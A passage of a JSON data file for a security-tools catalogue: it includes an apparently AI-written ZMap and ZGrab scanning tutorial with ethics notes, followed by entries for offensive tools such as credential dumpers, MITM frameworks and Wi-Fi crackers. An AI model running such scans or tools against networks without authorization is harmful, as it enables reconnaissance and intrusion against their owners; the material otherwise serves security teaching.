-o tcp_hits.txt\n\n# UDP (DNS)\nsudo zmap --probe-module=udp -p 53 -w targets.txt -r 50 -o udp_dns_hits.txt\n\n# ICMP echo (ping)\nsudo zmap --probe-module=icmp_echoscan -w targets.txt -r 50 -o icmp_hits.txt\n\n# List probe modules\nzmap --list-probe-modules\n```\n\n#### Module args example (UDP with payload)\n\n```bash\n# create a UDP payload file (binary or text)\necho -n -e \"\\x30\\x26...\" > snmp_payload.bin\nsudo zmap --probe-module=udp -p 161 --probe-args=file:snmp_payload.bin -w targets.txt -r 10 -o snmp_hits.json\n```\n\n### What to expect\n\n* Each module can return different classifications (e.g., `SYN-ACK` for TCP, or `ICMP-TTL` responses). Read module help for module-specific fields.\n\n### Troubleshooting & tips\n\n* Not all distributions ship with every probe module. Building from source may be required for advanced modules.\n\n### Safety / ethics note\n\n* Some probes (especially with payloads) can trigger IDS or cause side effects on services. Test only in lab environments unless explicitly authorized.\n\n---\n\n## 6. Rate control & bandwidth limiting\n\n### What it is / Why it matters\n\nControlling the rate prevents network congestion and reduces the chance of triggering alarms.\n\n### Commands\n\n```bash\n# set packets per second\nsudo zmap -p 80 -w targets.txt -r 100 -o out.txt\n\n# bandwidth limit\nsudo zmap -p 80 -w targets.txt -B 5M -o out_bw.txt\n\n# very small test\nsudo zmap -p 80 -w targets.txt -r 10 -n 10 -o small_test.json\n```\n\n### What to expect\n\n* Lower `-r` leads to fewer sends per second and slower completion time but safer network impact.\n\n### Troubleshooting & tips\n\n* Watch `ip -s link show <iface>` to monitor drops. If drops climb, reduce `-r` or tune NIC buffers.\n\n### Safety / ethics note\n\n* Avoid scanning at high rates on shared infrastructure without coordination.\n\n---\n\n## 7. Output formats: plain / CSV / JSON / Extended\n\n### What it is / Why it matters\n\nChoose output format according to downstream tools (Pipes, ELK, CSV processing, or JSON-based tooling).\n\n### Commands\n\n```bash\n# plain (IP list)\nsudo zmap -p 80 -w targets.txt -o ips.txt\n\n# CSV\nsudo zmap -p 80 -w targets.txt -f csv -o results.csv\n\n# JSON (line-delimited)\nsudo zmap -p 80 -w targets.txt -f json -o results.json\n\n# extended CSV with chosen fields\nsudo zmap -p 80 -f csv -O extended --output-fields=saddr,daddr,sport,dport,timestamp -w targets.txt -o extended.csv\n```\n\n### What to expect\n\n* JSON is easiest for structured pipelines. CSV is compact and convenient for spreadsheets.\n\n### Troubleshooting & tips\n\n* Use `jq` for JSON parsing in shell pipelines. Example: `jq -r '.daddr' results.json`.\n\n---\n\n## 8. Save & limit results: `-o`, `-n`, `--output-fields`\n\n### What it is / Why it matters\n\nLimit result size during development to avoid huge files.\n\n### Commands\n\n```bash\nsudo zmap -p 443 -w targets.txt -n 50 -o top50.txt\nsudo zmap -p 80 -f csv --output-fields=saddr,daddr,dport -w targets.txt -o chosen.csv\n```\n\n### What to expect\n\n* `-n` stops after `n` results; `-o` redirects output to a file.\n\n### Troubleshooting & tips\n\n* Use `-n` for initial tests and remove when you have approvals for larger runs.\n\n---\n\n## 9. Network interface & source IP selection\n\n### What it is / Why it matters\n\nSelecting an interface or source IP controls routing and helps in multi-homed environments.\n\n### Commands\n\n```bash\nsudo zmap -p 80 -i eth0 -w targets.txt -o if_out.txt\nsudo zmap -p 80 -S 192.168.1.100 -w targets.txt -o srcip_out.txt\nsudo ip netns exec zmap-lab zmap -p 80 -i veth-ns -S 10.200.200.2 -w targets.txt -o ns_out.json\n```\n\n### Troubleshooting & tips\n\n* \"Could not bind\" errors mean the selected source IP is not configured on the system. Use `ip addr show` to verify.\n\n---\n\n## 10. Packet customization: TTL, TCP window, payload\n\n### What it is / Why it matters\n\nCustomize low-level fields to match testing goals or to fingerprint behaviors.\n\n### Commands\n\n```bash\nsudo zmap -p 80 --ttl=64 -w targets.txt -o ttl_hits.txt\nsudo zmap --probe-module=tcp_synscan --probe-args=window:65535 -p 80 -w targets.txt -o tcp_win.txt\necho -n \"probe-payload\" > payload.bin\nsudo zmap -p 12345 --payload-file=payload.bin -w targets.txt -o payload_hits.txt\n```\n\n### Troubleshooting & tips\n\n* Some devices or middleboxes may respond differently to unusual TTL or payloads; test in lab first.\n\n---\n\n## 11. ZMap → ZGrab pipeline (banner grabbing)\n\n### What it is / Why it matters\n\nZMap quickly discovers hosts; ZGrab fetches application-level banners (HTTP titles, TLS certs) from those hosts.\n\n### Commands\n\n```bash\nsudo zmap -p 80 -w targets.txt -f csv --output-fields=daddr -o hosts.csv\nawk -F',' '{print $1}' hosts.csv > iplist.txt\ncat iplist.txt | zgrab --port 80 --http=\"/\" --output-file=banners.json\njq -c '.[] | {ip:.ip, status:.data.http.status_code, title:.data.http.title}' banners.json | sed -n '1,5p'\n```\n\n### What to expect\n\n* `banners.json` contains structured responses, including headers, status codes, and optional HTML titles.\n\n### Troubleshooting & tips\n\n* ZGrab may need TLS flags for HTTPS. Use `--tls` or zgrab2 for more modern TLS options.\n\n---\n\n## 12. Real-time streaming & pipe processing\n\n### What it is / Why it matters\n\nProcessing results as they arrive enables faster analysis, immediate follow-up actions, and streaming into other systems.\n\n### Example command\n\n```bash\nsudo zmap -p 80 -w targets.txt -f csv -r 50 | \\\nwhile IFS=, read -r ip; do\n  echo \"Found: $ip\"\n  echo \"$ip\" | zgrab --port 80 --http=\"/\" --output-file=- 2>/dev/null | jq .\ndone\n```\n\n### Troubleshooting & tips\n\n* Keep per-hit processing light. Heavy processing (e.g., database writes) should be offloaded to worker queues to avoid blocking the pipeline.\n\n---\n\n## 13. Performance tuning: `ulimit` & kernel buffers\n\n### What it is / Why it matters\n\nHigh-rate scanning demands more file descriptors and larger kernel socket buffers.\n\n### Commands\n\n```bash\n# increase open file descriptors\nulimit -n 65535\n\n# system tuning\necho 'net.core.rmem_max = 134217728' | sudo tee -a /etc/sysctl.conf\necho 'net.core.wmem_max = 134217728' | sudo tee -a /etc/sysctl.conf\nsudo sysctl -p\n\n# monitor NIC stats\nwatch -n 1 'ip -s link show eth0'\n```\n\n### Troubleshooting & tips\n\n* Tune gradually and observe NIC drops and CPU usage. For very large scans consider moving to 10GbE NICs and multiple machines.\n\n---\n\n## 14. Monitoring & statistics during a run\n\n### Commands\n\n```bash\nsudo zmap -p 80 -w targets.txt -r 100 --monitor-file=monitor.csv --progress-updates -o out.json\ntail -f monitor.csv\nwatch -n 1 'ss -s'\n```\n\n### What to expect\n\n* `monitor.csv` provides counters and timing information that can be used to compute hit rates and identify problems.\n\n---\n\n## 15. Automate scans: systemd service & timer\n\n### Service unit example `/etc/systemd/system/zmap-test.service`\n\n```ini\n[Unit]\nDescription=ZMap daily test\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\nType=oneshot\nExecStart=/usr/bin/ip netns exec zmap-lab /usr/bin/zmap -i veth-ns -S 10.200.200.2 -p 80 -w /home/you/targets.txt -r 50 -n 50 -f json -o /var/log/zmap/http_hits.json\n\n[Install]\nWantedBy=multi-user.target\n```\n\n### Timer example `/etc/systemd/system/zmap-test.timer`\n\n```ini\n[Unit]\nDescription=Run zmap-test daily\n\n[Timer]\nOnCalendar=*-*-* 03:00:00\nPersistent=true\n\n[Install]\nWantedBy=timers.target\n```\n\n### Commands\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable --now zmap-test.timer\nsudo systemctl start zmap-test.service\nsudo journalctl -u zmap-test.service -n 200\n```\n\n### Tips\n\n* Keep scheduled jobs conservative. Capture output for audit.\n\n---\n\n## 16. Parse & store results (SQLite example)\n\n### What it is / Why it matters\n\nStoring results in a local database simplifies queries, joins with enrichment data, and simple reporting.\n\n### Importer script (save as `import_zmap_sqlite.py`)\n\n```python\n#!/usr/bin/env python3\nimport sqlite3, json\nDB='zmap_results.db'\nZMAP='hits.json'   # line-delimited JSON from zmap\nconn = sqlite3.connect(DB)\nc = conn.cursor()\nc.execute('CREATE TABLE IF NOT EXISTS hits (daddr TEXT PRIMARY KEY, saddr TEXT, dport INTEGER, ts TEXT)')\nconn.commit()\nwith open(ZMAP) as f:\n    for line in f:\n        obj = json.loads(line)\n        c.execute('INSERT OR REPLACE INTO hits (daddr,saddr,dport,ts) VALUES (?,?,?,?)',\n                  (obj.get('daddr'), obj.get('saddr'), obj.get('dport'), obj.get('timestamp')))\nconn.commit()\nconn.close()\nprint('Imported into', DB)\n```\n\n### Run & query\n\n```bash\npython3 import_zmap_sqlite.py\nsqlite3 zmap_results.db \"SELECT daddr, ts FROM hits ORDER BY ts DESC LIMIT 10;\"\n```\n\n---\n\n## 17. Ethics, legal, and safe practices\n\n### Checklist\n\n* Obtain explicit written authorization before scanning third-party networks.\n* Start with `--dryrun` and small test sets (`-n 10`, `-r 10`).\n* Maintain logs of approvals, scan time, scope, and parameters.\n* Use blacklists to exclude sensitive ranges.\n* Notify upstream providers for high-rate scans.\n\n### Safety commands\n\n```bash\nsudo zmap -p 80 --dryrun -w targets.txt\nsudo zmap -p 80 -w targets.txt -n 10 -r 10 -o tiny_test.json\n```\n\n---\n\n## 18. IPv6 scanning considerations\n\n### What it is / Why it matters\n\nIPv6 cannot be brute-forced like IPv4 due to the large address space. Research uses targeted lists, DNS enumeration, and heuristics.\n\n### Targeted example (if your ZMap supports IPv6)\n\n```bash\n# ipv6_targets.txt example\n2001:db8::1\n2001:db8::2\n\n# run (if -6 supported by build)\nsudo zmap -6 -p 80 -w ipv6_targets.txt -r 10 -o ipv6_hits.json\n```\n\n---\n\n## 19. Distributed / multi-host scanning orchestration\n\n### What it is / Why it matters\n\nSplitting scan load reduces duration and per-host impact while allowing parallelism.\n\n### Simple orchestration pattern\n\n```bash\n# partition large_targets.txt into 4 parts\nsplit -n l/4 large_targets.txt targets_part_\n\n# run on remote hosts (scan_hosts.txt contains remote node hostnames)\ncat scan_hosts.txt | parallel -j 4 ssh {} \"sudo zmap -p 80 -w ~/targets_part_{}.txt -r 500 -o ~/zmap_out_{}.json\"\n```\n\n### Tips\n\n* Ensure non-overlapping partitioning. Use secure keys and coordinate with network teams.\n\n---\n\n## 20. Result visualization (maps, dashboards)\n\n### What it is / Why it matters\n\nVisualization helps spot geographic or ASN concentration and trends.\n\n### Quick GeoIP CSV example\n\n```bash\nawk -F',' '{print $1}' results.csv | sort -u > ips.txt\nwhile read ip; do\n  country=$(geoiplookup $ip | awk -F: '{print $2}' | cut -d',' -f1)\n  echo \"$ip,$country\"\ndone < ips.txt > ips_countries.csv\n```\n\n### Better approach\n\nUse MaxMind mmdb locally or import to Elastic/Grafana for interactive dashboards.\n\n---\n\n## 21. IDS/IPS detection & responsible tuning\n\n### What it is / Why it matters\n\nScans trigger IDS/IPS; responsible tuning reduces false positives during research.\n\n### Responsible tuning example\n\n```bash\nsudo zmap -p 80 -r 10 --source-port=40000-45000 -w targets.txt -o lowrate.json\n```\n\n### Ethics reminder\n\nDo not attempt to evade detection in networks you do not own.\n\n---\n\n## 22. Writing or customizing probe modules\n\n### What it is / Why it matters\n\nCustom modules allow targeted application-level probes with special payloads and parsing.\n\n### Development workflow (overview)\n\n1. Clone the zmap repo.\n2. Inspect `src/modules/probe_modules/` for examples.\n3. Create new module (C), register, and rebuild.\n\n```bash\ngit clone https://github.com/zmap/zmap.git\ncd zmap\n# add module source under src/modules/probe_modules\ncmake .\nmake -j$(nproc)\nsudo make install\n```\n\n### Tips\n\n* Write unit tests and test in isolated namespaces. Follow C project best practices.\n\n---\n\n## 23. Debugging & verbose logging\n\n### Commands\n\n```bash\n# simulate without sending\nsudo zmap -p 80 --dryrun -w targets.txt\n\n# status updates and logs\nsudo zmap -p 80 -w targets.txt --status-updates-file=status.log --progress-updates -r 50\ntail -f status.log\n\ndmesg | tail -n 50\n```\n\n### Troubleshooting\n\n* Permission errors: add `sudo` or `setcap cap_net_raw+ep /usr/local/bin/zmap`.\n* NIC drops: reduce `-r` and monitor `ip -s link`.\n\n---\n\n## 24. Contributing & building from source (dev workflow)\n\n### Commands\n\n```bash\ngit clone https://github.com/zmap/zmap.git\ncd zmap\nsudo apt install -y build-essential cmake libgmp3-dev gengetopt libpcap-dev flex byacc libjson-c-dev pkg-config libunistring-dev\ncmake .\nmake -j$(nproc)\n# run tests if project provides any\nctest --output-on-failure || true\n```\n\n### Tips\n\n* Follow repository contribution guidelines and open PRs with clear descriptions and tests.\n\n---\n\n## 25. Logging, retention & privacy-safe storage\n\n### logrotate example `/etc/logrotate.d/zmap`\n\n```\n/var/log/zmap/*.json {\n    daily\n    rotate 14\n    compress\n    missingok\n    notifempty\n    create 0640 root root\n}\n```\n\n### Hash IPs to protect privacy\n\n```bash\njq -r '.daddr' hits.json | while read ip; do echo -n \"$ip\" | sha256sum | awk '{print $1}'; done > hits_hashed.txt\n```\n\n### Policy\n\nStore raw IPs only with strict access controls and legal approval.\n\n---\n\n## 26. SIEM / ELK integration (indexing ZMap results)\n\n### Quick steps\n\n1. Write ZMap JSON to `/var/log/zmap/hits.json`.\n2. Configure Filebeat or Fluentd with JSON parsing to forward to Logstash/Elastic.\n\n### Simple test\n\n```bash\nsudo zmap -p 80 -w targets.txt -f json -o /var/log/zmap/hits.json\ntail -F /var/log/zmap/hits.json | while read line; do echo \"$line\" | jq .; done\n```\n\n---\n\n## 27. Research publication & responsible disclosure workflow\n\n### Metadata for reproducibility\n\n```bash\ncat > scan_metadata.json <<'JSON'\n{\n  \"date\": \"2025-10-15T11:00:00Z\",\n  \"tool\": \"zmap\",\n  \"version\": \"$(zmap --version 2>&1 | tr -d '\\n')\",\n  \"targets\": \"192.0.2.0/28 (test)\",\n  \"rate\": 50,\n  \"approvals\": \"approve_record_id_12345\"\n}\nJSON\n\ncp hits.json hits_20251015.json\ncp scan_metadata.json hits_20251015.metadata.json\n```\n\n### Responsible disclosure checklist\n\n* Verify legal and IRB obligations.\n* Notify affected parties when appropriate.\n* Release aggregated/anonymized findings.\n* Make raw data available under restricted access only.\n\n---\n\n## Appendix — Useful snippets & templates\n\n### Safe `targets.txt` example\n\n```\n10.0.0.10\n10.0.0.11\n```\n\n### Quick importer (SQLite) - `import_zmap_sqlite.py`\n\n```python\n#!/usr/bin/env python3\nimport sqlite3, json\nDB='zmap_results.db'\nZMAP='hits.json'\nconn = sqlite3.connect(DB)\nc = conn.cursor()\nc.execute('CREATE TABLE IF NOT EXISTS hits (daddr TEXT PRIMARY KEY, saddr TEXT, dport INTEGER, ts TEXT)')\nwith open(ZMAP) as f:\n    for line in f:\n        obj = json.loads(line)\n        c.execute('INSERT OR REPLACE INTO hits (daddr,saddr,dport,ts) VALUES (?,?,?,?)',\n                  (obj.get('daddr'), obj.get('saddr'), obj.get('dport'), obj.get('timestamp')))\nconn.commit()\nconn.close()\nprint('Imported into', DB)\n```\n\n---\n\n## Next steps I can take for you\n\n* Export this as a downloadable `.md` file and place it in the canvas.\n* Add runnable helper files (`targets.txt`, `import_zmap_sqlite.py`, `zmap-test.service`, `zmap-test.timer`, synthetic `hits.json`/`banners.json`).\n* Produce a printable PDF.\n\nWhich of these would you like me to do now?\n"
      }
    ]
  },
  {
    "name": "Netcat",
    "description": "The \"Swiss-army knife\" for TCP/IP networking.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "port listening",
      "data transfer",
      "backdoor"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Angry IP Scanner",
    "description": "Fast and friendly network scanner.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "ip scanning",
      "port scanning",
      "gui"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "Nikto",
    "description": "A web server scanner which performs comprehensive tests.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "web server",
      "vulnerability scanning"
    ],
    "color": "#75e54b"
  },
  {
    "name": "OpenVAS",
    "description": "A full-featured vulnerability scanner.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "vulnerability management",
      "network security"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "Nessus",
    "description": "A proprietary vulnerability scanner.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "vulnerability assessment",
      "compliance"
    ],
    "color": "#c34be5"
  },
  {
    "name": "hping3",
    "description": "A command-line oriented TCP/IP packet assembler/analyzer.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "packet crafting",
      "firewall testing"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Scapy",
    "description": "A powerful Python-based interactive packet manipulation program.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "packet crafting",
      "protocol analysis",
      "python"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Ettercap",
    "description": "A comprehensive suite for man-in-the-middle attacks.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "mitm",
      "sniffing",
      "arp spoofing"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Bettercap",
    "description": "Powerful, easily extensible and portable framework for MITM attacks.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "mitm",
      "network monitoring",
      "modular"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Responder",
    "description": "A LLMNR, NBT-NS and MDNS poisoner.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "poisoning",
      "credential capture",
      "internal pentest"
    ],
    "color": "#4be575"
  },
  {
    "name": "Zeek (Bro)",
    "description": "A powerful network analysis framework.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "ids",
      "network security monitoring",
      "traffic analysis"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Snort",
    "description": "An open-source intrusion prevention system (IPS).",
    "category": "Network Scanning & Analysis",
    "tags": [
      "ids",
      "ips",
      "packet logging"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Suricata",
    "description": "A high performance Network IDS, IPS and Network Security Monitoring engine.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "ids",
      "ips",
      "pcap analysis"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Kismet",
    "description": "A wireless network detector, sniffer, and intrusion detection system.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "wifi",
      "wardriving",
      "wireless ids"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "Netdiscover",
    "description": "An active/passive ARP reconnaissance tool.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "arp scanning",
      "network discovery",
      "lan"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Burp Suite",
    "description": "An integrated platform for performing security testing of web applications.",
    "category": "Web Application Security",
    "tags": [
      "proxy",
      "spider",
      "intruder",
      "repeater"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "OWASP ZAP",
    "description": "An open-source web application security scanner.",
    "category": "Web Application Security",
    "tags": [
      "automated scanner",
      "manual testing",
      "fuzzing"
    ],
    "color": "#c34be5"
  },
  {
    "name": "sqlmap",
    "description": "Automates detecting and exploiting SQL injection flaws.",
    "category": "Web Application Security",
    "tags": [
      "sql injection",
      "database takeover"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Arachni",
    "description": "A feature-full, modular, high-performance Ruby framework for web app scanning.",
    "category": "Web Application Security",
    "tags": [
      "vulnerability scanner",
      "ruby",
      "web"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Wfuzz",
    "description": "A web application fuzzer.",
    "category": "Web Application Security",
    "tags": [
      "fuzzing",
      "bruteforce",
      "web discovery"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Dirb",
    "description": "A Web Content Scanner that looks for existing (and/or hidden) Web Objects.",
    "category": "Web Application Security",
    "tags": [
      "directory bruteforce",
      "web discovery",
      "cli"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Dirbuster",
    "description": "A multi-threaded java application designed to brute force directories and files names on web/application servers.",
    "category": "Web Application Security",
    "tags": [
      "directory bruteforce",
      "gui",
      "owasp"
    ],
    "color": "#4be575"
  },
  {
    "name": "Gobuster",
    "description": "A tool used to brute-force URIs (directories and files) in web sites.",
    "category": "Web Application Security",
    "tags": [
      "directory bruteforce",
      "dns subdomain",
      "go"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "WhatWeb",
    "description": "A next generation web scanner that identifies technologies used on websites.",
    "category": "Web Application Security",
    "tags": [
      "fingerprinting",
      "cms detection",
      "javascript libraries"
    ],
    "color": "#9be54b"
  },
  {
    "name": "WPScan",
    "description": "A black box WordPress security scanner.",
    "category": "Web Application Security",
    "tags": [
      "wordpress",
      "cms scanner",
      "vulnerability"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "JoomScan",
    "description": "A tool to detect Joomla CMS vulnerabilities.",
    "category": "Web Application Security",
    "tags": [
      "joomla",
      "cms scanner",
      "vulnerability"
    ],
    "color": "#e54b75"
  },
  {
    "name": "FFUF",
    "description": "Fuzz Faster U Fool: A fast web fuzzer written in Go.",
    "category": "Web Application Security",
    "tags": [
      "fuzzing",
      "web discovery",
      "go"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Sublist3r",
    "description": "A fast subdomains enumeration tool for penetration testers.",
    "category": "Web Application Security",
    "tags": [
      "subdomain enumeration",
      "osint",
      "python"
    ],
    "color": "#4be575"
  },
  {
    "name": "Amass",
    "description": "In-depth Attack Surface Mapping and Asset Discovery.",
    "category": "Web Application Security",
    "tags": [
      "subdomain enumeration",
      "osint",
      "attack surface"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Nuclei",
    "description": "Fast and customizable vulnerability scanner based on simple YAML based templates.",
    "category": "Web Application Security",
    "tags": [
      "vulnerability scanner",
      "templates",
      "fast"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Commix",
    "description": "Automated All-in-One OS Command Injection and Exploitation Tool.",
    "category": "Web Application Security",
    "tags": [
      "command injection",
      "exploitation",
      "python"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "XSSer",
    "description": "An automatic -framework- to detect, exploit and report XSS vulnerabilities.",
    "category": "Web Application Security",
    "tags": [
      "xss",
      "cross site scripting",
      "exploitation"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "BeEF",
    "description": "The Browser Exploitation Framework.",
    "category": "Web Application Security",
    "tags": [
      "xss",
      "browser hooking",
      "client side"
    ],
    "color": "#56e54b"
  },
  {
    "name": "NoSQLMap",
    "description": "A tool to audit for and automate injection attacks on NoSQL databases.",
    "category": "Web Application Security",
    "tags": [
      "nosql injection",
      "database",
      "mongodb"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "XSStrike",
    "description": "Advanced XSS scanner with four handwritten parsers, an intelligent payload generator, and a powerful fuzzing engine.",
    "category": "Web Application Security",
    "tags": [
      "xss",
      "fuzzer",
      "scanner"
    ],
    "color": "#a04be5"
  },
  {
    "name": "John the Ripper",
    "description": "A fast password cracker.",
    "category": "Password Attacks",
    "tags": [
      "password cracking",
      "hash cracking",
      "dictionary attack"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Hashcat",
    "description": "The world's fastest and most advanced password recovery utility.",
    "category": "Password Attacks",
    "tags": [
      "gpu password cracking",
      "hash cracking",
      "brute-force"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Hydra",
    "description": "A very fast network logon cracker which supports many different services.",
    "category": "Password Attacks",
    "tags": [
      "brute-force",
      "dictionary attack",
      "login cracker"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "Medusa",
    "description": "A speedy, parallel, and modular, login brute-forcer.",
    "category": "Password Attacks",
    "tags": [
      "brute-force",
      "login cracker",
      "parallel"
    ],
    "color": "#75e54b"
  },
  {
    "name": "Cain & Abel",
    "description": "A password recovery tool for Microsoft Operating Systems.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "password recovery",
      "sniffer"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "Ophcrack",
    "description": "A free Windows password cracker based on rainbow tables.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "rainbow tables",
      "lm hashes"
    ],
    "color": "#c34be5"
  },
  {
    "name": "RainbowCrack",
    "description": "A general purpose rainbow table based hash cracker.",
    "category": "Password Attacks",
    "tags": [
      "rainbow tables",
      "hash cracking"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "WCE",
    "description": "Windows Credentials Editor, a security tool to list logon sessions.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "credential dumping",
      "lsa secrets"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "fgdump",
    "description": "An old executable that extracts NTLM and LanMan password hashes.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "hash dumping",
      "sam"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Pwdump",
    "description": "A program that can dump password hashes from the SAM database.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "hash dumping",
      "sam"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "CeWL",
    "description": "A custom word list generator.",
    "category": "Password Attacks",
    "tags": [
      "wordlist generator",
      "web scraping",
      "password profiling"
    ],
    "color": "#4be575"
  },
  {
    "name": "crunch",
    "description": "A wordlist generator where you can specify a standard character set or a character set you specify.",
    "category": "Password Attacks",
    "tags": [
      "wordlist generator",
      "brute-force"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Ncrack",
    "description": "A high-speed network authentication cracking tool.",
    "category": "Password Attacks",
    "tags": [
      "network login",
      "brute-force",
      "nmap"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Patator",
    "description": "A multi-purpose brute-forcer, with a modular design.",
    "category": "Password Attacks",
    "tags": [
      "brute-force",
      "multi-protocol",
      "python"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Crowbar",
    "description": "A brute-forcing tool that can be used during penetration tests.",
    "category": "Password Attacks",
    "tags": [
      "rdp",
      "vnc",
      "ssh keys"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "SAMInside",
    "description": "A program for recovering user passwords of Windows NT/2000/XP/2003/Vista/7.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "password recovery",
      "offline attack"
    ],
    "color": "#4be575"
  },
  {
    "name": "L0phtCrack",
    "description": "A password auditing and recovery application.",
    "category": "Password Attacks",
    "tags": [
      "windows",
      "password audit",
      "hash cracking"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "DaveGrohl",
    "description": "A brute-force tool for OS X.",
    "category": "Password Attacks",
    "tags": [
      "osx",
      "brute-force",
      "dictionary attack"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Brutus",
    "description": "One of the oldest, fastest, and most popular online password crackers.",
    "category": "Password Attacks",
    "tags": [
      "brute-force",
      "network login",
      "windows"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "LaZagne",
    "description": "An open source password recovery project.",
    "category": "Password Attacks",
    "tags": [
      "password recovery",
      "credentials",
      "post-exploitation"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Aircrack-ng",
    "description": "A complete suite of tools to assess Wi-Fi network security.",
    "category": "Wireless Hacking",
    "tags": [
      "wifi",
      "wep",
      "wpa/wpa2-psk",
      "cracking"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Reaver",
    "description": "A tool that brute forces WPS PINs.",
    "category": "Wireless Hacking",
    "tags": [
      "wps",
      "brute-force",
      "wifi"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "PixieWPS",
    "description": "A tool used to bruteforce WPS pins in offline mode.",
    "category": "Wireless Hacking",
    "tags": [
      "wps",
      "offline attack",
      "wifi"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Wifite",
    "description": "An automated wireless attack tool.",
    "category": "Wireless Hacking",
    "tags": [
      "automated",
      "wifi cracking",
      "wps",
      "wep"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Fern Wifi Cracker",
    "description": "A Wireless security auditing and attack software program.",
    "category": "Wireless Hacking",
    "tags": [
      "gui",
      "wifi cracking",
      "wep",
      "wpa"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Wi-Fi Pumpkin",
    "description": "A framework for creating rogue Wi-Fi access points.",
    "category": "Wireless Hacking",
    "tags": [
      "rogue ap",
      "mitm",
      "phishing"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "Fluxion",
    "description": "A social engineering wireless auditing tool.",
    "category": "Wireless Hacking",
    "tags": [
      "phishing",
      "rogue ap",
      "wpa"
    ],
    "color": "#75e54b"
  },
  {
    "name": "MDK3",
    "description": "A Wi-Fi testing tool that exploits common 802.11 protocol weaknesses.",
    "category": "Wireless Hacking",
    "tags": [
      "dos",
      "wifi jamming",
      "ssid flooding"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "CoWPAtty",
    "description": "An offline dictionary attack tool for WPA/WPA2.",
    "category": "Wireless Hacking",
    "tags": [
      "wpa",
      "dictionary attack",
      "offline"
    ],
    "color": "#c34be5"
  },
  {
    "name": "Airgeddon",
    "description": "A multi-use bash script for Linux systems to audit wireless networks.",
    "category": "Wireless Hacking",
    "tags": [
      "bash",
      "wifi audit",
      "all-in-one"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "KisMAC",
    "description": "A wireless stumbling and security tool for Mac OS X.",
    "category": "Wireless Hacking",
    "tags": [
      "osx",
      "wardriving",
      "wifi scanner"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "inSSIDer",
    "description": "A Wi-Fi optimization and troubleshooting tool.",
    "category": "Wireless Hacking",
    "tags": [
      "wifi scanner",
      "channel analysis",
      "troubleshooting"
    ],
    "color": "#e54b75"
  },
  {
    "name": "NetStumbler",
    "description": "A tool for Windows that facilitates detection of Wireless LANs.",
    "category": "Wireless Hacking",
    "tags": [
      "windows",
      "wardriving",
      "wifi scanner"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Ghost Phisher",
    "description": "A Wireless and Ethernet security auditing and attack software program.",
    "category": "Wireless Hacking",
    "tags": [
      "phishing",
      "fake ap",
      "session hijacking"
    ],
    "color": "#4be575"
  },
  {
    "name": "Eaphammer",
    "description": "A toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks.",
    "category": "Wireless Hacking",
    "tags": [
      "wpa2-enterprise",
      "evil twin",
      "rogue ap"
    ],
